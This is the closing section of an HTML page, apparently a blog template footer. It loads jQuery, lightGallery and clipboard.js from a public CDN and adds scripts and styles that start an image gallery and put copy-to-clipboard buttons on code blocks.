    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>